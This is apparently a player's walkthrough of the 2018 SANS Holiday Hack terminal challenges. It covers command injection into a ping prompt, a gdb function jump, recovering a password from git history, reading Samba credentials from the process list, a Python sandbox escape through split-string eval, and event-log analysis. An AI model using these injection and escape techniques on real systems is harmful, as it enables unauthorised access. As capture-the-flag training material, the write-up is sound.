
## Terminals
* Exit vi (done):
type `:q` and you're done.

# Minty Candycane Employee onboard (WIP)
1. First enter your information, and you'll see how the information is saved in a SQLite DB.
2. Use the "Test system" option and enter an IP. You'll notice it will ping.
3. Try to inject commands, so I've entered `127.0.0.1; ls ; ` and I've got this output:
```bash
Validating data store for employee onboard information.
Enter address of server: 127.0.0.1 ; ls -lah ;
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.043 msFtang

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2048ms
rtt min/avg/max/mdev = 0.036/0.040/0.043/0.008 ms
total 5.4M
drwxr-xr-x 1 elf  elf  4.0K Dec 20 20:49 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:17 ..
-rw-r--r-- 1 elf  elf   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root   95 Dec 14 16:13 .bashrc
drwxr-xr-x 3 elf  elf  4.0K Dec 20 20:46 .cache
drwxr-xr-x 3 elf  elf  4.0K Dec 20 20:47 .local
-rw-r--r-- 1 root root 3.8K Dec 14 16:13 menu.ps1
-rw-rw-rw- 1 root root  24K Dec 20 20:49 onboard.db
-rw-r--r-- 1 elf  elf   655 May 16  2017 .profile
-rwxr-xr-x 1 root root 5.3M Dec 14 16:13 runtoanswer
onboard.db: SQLite 3.x database

```
4. Now we'll need to find a way to explore that onboard.db SQLIte DB.
```bash
Validating data store for employee onboard information.
Enter address of server: 1.1.1.1; sqlite3
connect: Network is unreachable
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open onboard.db
sqlite> .tables
onboard
sqlite> .schema onboard
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
sqlite> select * from onboard where fname like 'Chan' OR lname LIKE 'Chan';
84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com
sqlite>
```

5. The last step would be to run `runtoanswer`

```bash
Validating data store for employee onboard information.
Enter address of server: 1.1.1.1; runtoanswer
connect: Network is unreachable
Loading, please wait......

Enter Mr. Chan's first name: Scott

    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'
  'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;
 'oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo;
 :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo
 coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo
 coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo
 coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo
 cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo
 cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
 cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo
 cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo
 OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW
 OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW
 OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW
 OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW
 OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW
 OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW
 OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW
 xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK
 .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,
  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,
    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.


Congratulations!

onboard.db: SQLite 3.x database
Press Enter to continue...:
```


# Curl expert
1. It needs to be an HTTP2 request (so `CURL -X POST 127.0.0.1:8080 --http2`)
> `listen                  8080 http2`

2.The response might be an octet stream
`default_type application/octet-stream;`

3. By running `curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge`, I've got this message:

```bash
elf@657c12ef9fab:~$ curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge
* Rebuilt URL to: 127.0.0.1:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x5650dd2ffdc0)
> POST / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.52.1
> Accept: */*
>
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
< HTTP/2 200
< server: nginx/1.10.3
< date: Thu, 27 Dec 2018 20:47:59 GMT
< content-type: text/html; charset=UTF-8
<
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"


 </body>
</html>
```

4. The command to run would be:
`curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge -d"status=on"`

5. Done! Response is:
```
-Holly Evergreen
<p>Congratulations! You\'ve won and have successfully completed this challenge.</p>
<p>POSTing data in HTTP/2.0.</p>
```


# Shinny Upatree The sleighbell
1. List, note you have gdb available.
2. Ran gdb
3. Listed functions with `objdump -t sleighbell-lotto | grep "F"`
4. gdb sle
5. help breakpoints
6. break main
8. run
9. jump winnerwinner



# Tangle coalbox Lethal ForensicELFication:
```bash
 Tangle Coalbox, ER Investigator
  Find the first name of the elf of whom a love poem
  was written.  Complete this challenge by submitting
  that name to runtoanswer.
```

1. Looking around I've noticed this folder: /home/elf/.secrets/her
2. There's a text file which contains:

```bash
elf@d9378db2c95b:~/.secrets/her$ cat poem.txt
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
Shining many a beautiful sleighbell bearing cheer and sound so pure--
  There he cleaned them, nearly napping, suddenly there came a tapping,
As of someone gently rapping, rapping at the sleigh house door.
"'Tis some caroler," he muttered, "tapping at my sleigh house door--
  Only this and nothing more."

Then, continued with more vigor, came the sound he didn't figure,
Could belong to one so lovely, walking 'bout the North Pole grounds.
  But the truth is, she WAS knocking, 'cause with him she would be talking,
Off with fingers interlocking, strolling out with love newfound?
Gazing into eyes so deeply, caring not who sees their rounds.
  Oh, 'twould make his heart resound!

Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
Floating over, more than walking, moving toward the sound still knocking,
  Pausing at the elf-length mirror, checked himself to study clearer,
Fixing hair and looking nearer, what a hunky elf - not shocking!
Peering through the peephole smiling, reaching forward and unlocking:
  NEVERMORE in tinsel stocking!

Greeting her with smile dashing, pearly-white incisors flashing,
Telling jokes to keep her laughing, soaring high upon the tidings,
  Of good fortune fates had borne him.  Offered her his dexter forelimb,
Never was his future less dim!  Should he now consider gliding--
No - they shouldn't but consider taking flight in sleigh and riding
  Up above the Pole abiding?

Smile, she did, when he suggested that their future surely rested,
Up in flight above their cohort flying high like ne'er before!
  So he harnessed two young reindeer, bold and fresh and bearing no fear.
In they jumped and seated so near, off they flew - broke through the door!
Up and up climbed team and humor, Morcel being so adored,
  By his lovely NEVERMORE!

-Morcel Nougat
```

3. Looking around I've noticed there is a `.viminfo` file, which contains:
```bash

# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&Elinore

# Last Substitute String:
$NEVERMORE

# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:r .secrets/her/poem.txt
|2,0,1536607201,,"r .secrets/her/poem.txt"
:q
|2,0,1536606844,,"q"
:w
|2,0,1536606841,,"w"
:s/God/fates/gc
|2,0,1536606833,,"s/God/fates/gc"
```

4. The name seems to be Elinore.
```bash

Who was the poem written about? Elinore

WWNXXK00OOkkxddoolllcc::;;;,,,'''.............
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............
WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''
WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....
WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...
WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.
WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.
WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;
WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............

Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.

-Tangle Coalbox
-ER Investigator

Congratulations!
```

# Pepper Minstix webmail hack terminal
```bash
  Submit the compromised webmail username to
  runtoanswer to complete this challenge.
```

  (WIP)


# Coalbox Dev Ops Fail terminal
1. Find Sparkle's password, then run the runtoanswer tool

2. `git log` shows the following entry, among others:
```bash
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use
```
3. Go to `~/kcconfmgmt/server/config` to find `config.js.def`

4. `git log config.js.def` shows only one entry, checking out the previous version should do the trick. So check out `b2376f4a93ca1889ba7d947c2d14be9a5d138802` and see.

5. `git checkout b2376f4a93ca1889ba7d947c2d14be9a5d138802`

6. The file `server/config/config.js` contains:
```javascript
// Database URL
module.exports = {
    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
};
```

7. `./runtoanswer`, enter `twinkletwinkletwinkle`

8. Read the nice poem:

```bash
This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.
```

# Wunorse Openslae Samba terminal
1. Run `ps aux | more` to see all running processes:
```bash
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  17952  2868 pts/0    Ss   20:35   0:00 /bin/bash /sbin/init
root        10  0.0  0.0  45320  3164 pts/0    S    20:35   0:00 sudo -u manager /home/manag
er/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
root        11  0.0  0.0  45320  3152 pts/0    S    20:35   0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
root        15  0.0  0.0  45320  3056 pts/0    S    20:35   0:00 sudo -u elf /bin/bash
manager     16  0.0  0.0   9500  2600 pts/0    S    20:35   0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not
-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
manager     17  0.0  0.0  33848  7968 pts/0    S    20:35   0:00 /usr/bin/python /home/manager/report-check.py
elf         19  0.0  0.0  18204  3364 pts/0    S    20:35   0:00 /bin/bash
root        23  0.0  0.0 316664 15488 ?        Ss   20:35   0:00 /usr/sbin/smbd
root        24  0.0  0.0 308372  5888 ?        S    20:35   0:00 /usr/sbin/smbd
root        25  0.0  0.0 308364  4532 ?        S    20:35   0:00 /usr/sbin/smbd
root        27  0.0  0.0 316664  6064 ?        S    20:35   0:00 /usr/sbin/smbd
manager     37  0.0  0.0   4196   668 pts/0    S    20:37   0:00 sleep 60
elf         42  0.0  0.0  36636  2740 pts/0    R+   20:38   0:00 ps aux
elf         43  0.0  0.0   6420   916 pts/0    S+   20:38   0:00 more
```

2. Tried logged in as user `report-upload`:
`smbclient -U report-upload //localhost/report-upload/`

3. When asked for a password, entered `directreindeerflatterystable`

4. Got access to Samba share. Then run `put report.txt report.txt`. Seemed to work:
```bash
smb: \> put report.txt report.txt
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
smb: \> Terminated
elf@e167a3f21960:~$

                               .;;;;;;;;;;;;;;;'
                             ,NWOkkkkkkkkkkkkkkNN;
                           ..KM; Stall Mucking ,MN..
                         OMNXNMd.             .oMWXXM0.
                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc
                        :MO                         xMl             '.
                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'
                        :MO  .ONNNNNNNNXk           xMl             :lc'
                        :MO   dOOOOOOOOOo           xMl             ;.
                        :MO   'cccccccccccccc:'     xMl
                        :MO  .WMMMMMMMMMMMMMMMW.    xMl
                        :MO    ...............      xMl
                        .NWxddddddddddddddddddddddddNW'
                          ;ccccccccccccccccccccccccc;




You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae
```


# Python Escape from LA terminal

```bash
>>> os = eval('__im'+'port__("os")')
>>> os.system("killall python")
Use of the command os.system is prohibited for this question.
>>> exec
Use of the command exec is prohibited for this question.
>>> eval
<built-in function eval>
>>> eval('os.sy'+'stem("killall python")')
sh: 1: killall: not found
32512
>>> eval('os.sy'+'stem("ps | aux pyt")')
sh: 1: aux: not found
32512
>>> eval('os.sy'+'stem("ps aux | pyt")')
sh: 1: pyt: not found
32512
>>> eval('os.sy'+'stem("ps aux | grep pyt")')
elf          1  0.0  0.0  33840 11020 pts/0    Ss+  16:29   0:00 python3 /bin/shell
elf         15  0.0  0.0   4500   708 pts/0    S+   16:43   0:00 sh -c ps aux | grep pyt
elf         17  0.0  0.0  11280   960 pts/0    S+   16:43   0:00 grep pyt
0
>>> eval('os.sy'+'stem("./i_escaped")')
Loading, please wait......



  ____        _   _
 |  _ \ _   _| |_| |__   ___  _ __
 | |_) | | | | __| '_ \ / _ \| '_ \
 |  __/| |_| | |_| | | | (_) | | | |
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary

You escaped! Congratulations!

0
>>>
```

# Yule Log Analysis
1. `ls` to find out the files in the current dir; then `python evtx_dump.py ho-ho-no.evtx > log.xml`
2. See the different events: `cat log.xml | grep EventID | sort | uniq -c | sort -rn` :
```bash
elf@64476099810b:~$ cat log.xml | grep EventID | sort | uniq -c | sort -rn
    756 <EventID Qualifiers="">4624</EventID>
    212 <EventID Qualifiers="">4625</EventID>
    109 <EventID Qualifiers="">4769</EventID>
    108 <EventID Qualifiers="">4776</EventID>
     45 <EventID Qualifiers="">4768</EventID>
     34 <EventID Qualifiers="">4799</EventID>
     10 <EventID Qualifiers="">4688</EventID>
      2 <EventID Qualifiers="">5059</EventID>
      2 <EventID Qualifiers="">4904</EventID>
      2 <EventID Qualifiers="">4738</EventID>
      2 <EventID Qualifiers="">4724</EventID>
      1 <EventID Qualifiers="">5033</EventID>
      1 <EventID Qualifiers="">5024</EventID>
      1 <EventID Qualifiers="">4902</EventID>
      1 <EventID Qualifiers="">4826</EventID>
      1 <EventID Qualifiers="">4647</EventID>
      1 <EventID Qualifiers="">4608</EventID>
```

2. What does each EventID mean?

- 4608: Windows is starting up
- 4624: An account was successfully logged on
- 4625: An account failed to log on
- 4647: User initiated logoff
- 4688: A new process has been created
- 4724: An attempt was made to reset an accounts password
- 4738: A user account was changed
- 4768: A Kerberos authentication ticket (TGT) was requested
- 4769: A Kerberos service ticket was requested
- 4776: The domain controller attempted to validate the credentials for an account
- 4826: Boot Configuration Data loaded
- 4902: The Per-user audit policy table was created
- 4904: An attempt was made to register a security event source
- 5024: The Windows Firewall Service has started successfully
- 5033: The Windows Firewall Driver has started successfully
- 5059: Key migration operation

3. The events `4738`, `4724` seem to be interesting, an account was changed and a password change attempts was issued. What does this event say?

4. The events `4624` and `4625` are interesting too. Run this command to see what happened with some events:
```bash
grep -E "4625|4624" log.xml -A 20 | grep -E "EventID|TargetUserName"  | grep -v HealthMailbox | grep -E "462|Data"
```

5. So I'll look for many `4625` followed by a `4624`; which points to:
`<Data Name="TargetUserName">minty.candycane</Data>`

6. Try `minty.candycane` as an answer:

```bash
Silly Minty Candycane, well this is what she gets.
"Winter2018" isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?
Congratulations!
```
